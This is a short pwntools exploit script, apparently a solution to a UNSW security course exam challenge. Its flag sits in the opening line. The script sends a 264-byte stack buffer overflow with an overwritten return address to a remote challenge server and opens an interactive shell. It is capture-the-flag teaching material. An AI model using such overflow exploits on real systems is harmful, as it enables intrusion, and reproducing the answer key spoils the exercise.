## Flag: COMP6447{it_really_was_due}
#!/usr/bin/env python
# UNSW COMP9447 18s2
# Exam Q1 - Pwnable
from pwn import *
import struct


# Exploit Variables
program = './assignment-was-due-6pm'
host = 'plzpwn.me'
port = 9995
elf = ELF(program)

# libc offsets

# search for gadgets
# libc = ELF('libc.so.6')
# gadget = lambda x : p32(libc.search(asm(x, arch=libc.arch)).next())

# Setup Connection
conn = remote(host, port)
# conn = process(program)
conn.recvuntil('enter: ')
conn.sendline('-1')
conn.recvline()
exp = 'A'*264
exp += p32(0x80485c6)
conn.sendline(exp)
conn.interactive()